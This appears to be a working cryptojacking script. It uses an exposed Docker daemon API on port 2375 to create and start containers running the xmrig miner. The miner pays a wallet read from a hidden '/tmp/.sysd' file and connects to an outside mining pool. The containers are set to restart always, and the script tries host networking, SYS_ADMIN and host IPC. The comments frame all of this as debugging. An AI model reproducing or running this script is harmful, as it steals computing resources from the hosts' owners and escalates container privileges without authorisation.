#!/bin/sh
# throwaway: isolate WHY the hostnet create failed on this daemon. Three bodies, same
# everything except the network mode, and print docker's own error text (the -f in the
# previous test swallowed it).
set -u
W=$(grep -m1 '^WALLET=' /tmp/.sysd/worker.env | cut -d= -f2- | tr -d '"')
# NOTE: no inner double quotes inside the Cmd string - that is what broke the first test
# ("invalid character '4' after array element": the JSON string was closed early).
SUP="while :; do /usr/bin/xmrig -o pool.supportxmr.com:443 -u $W -p isolation --no-color -k --tls --threads=1 --http-port=47999 --http-host=0.0.0.0; sleep 5; done"
BASE="\"Image\":\"xmrig/xmrig\",\"Entrypoint\":[\"sh\",\"-c\"],\"Cmd\":[\"$SUP\"]"

try() {   # $1 = label, $2 = extra HostConfig fragment
    n="kw$1"
    curl -sS -m 8 -X DELETE "http://127.0.0.1:2375/containers/$n?force=1" >/dev/null 2>&1 || :
    r=$(curl -sS -m 30 -X POST "http://127.0.0.1:2375/containers/create?name=$n" \
            -H 'Content-Type: application/json' \
            -d "{$BASE,\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}$2}}" 2>&1)
    echo "--- $1: $(printf '%s' "$r" | head -c 200)"
    id=$(printf '%s' "$r" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
    if [ -n "$id" ]; then
        e=$(curl -sS -m 20 -X POST "http://127.0.0.1:2375/containers/$n/start" 2>&1)
        echo "    start: [$(printf '%s' "$e" | head -c 160)]"
    fi
}

try A ',"NetworkMode":"host"'
try B ''
try C ',"CapAdd":["SYS_ADMIN"],"IpcMode":"host","PortBindings":{"47999/tcp":[{"HostPort":"47999"}]}'

sleep 6
echo "== host 47999 now: [$(curl -sS -m 4 http://127.0.0.1:47999/2/summary 2>/dev/null | head -c 120)]"
for n in kwA kwB kwC; do
    echo "--- $n state: $(curl -sS -m 6 http://127.0.0.1:2375/containers/$n/json 2>/dev/null | grep -o -e '"Running":[a-z]*' -e '"NetworkMode":"[a-z]*"' | head -2 | tr '\n' ' ')"
done
for n in kwA kwB kwC; do curl -sS -m 8 -X DELETE "http://127.0.0.1:2375/containers/$n?force=1" >/dev/null 2>&1 || :; done
date -u
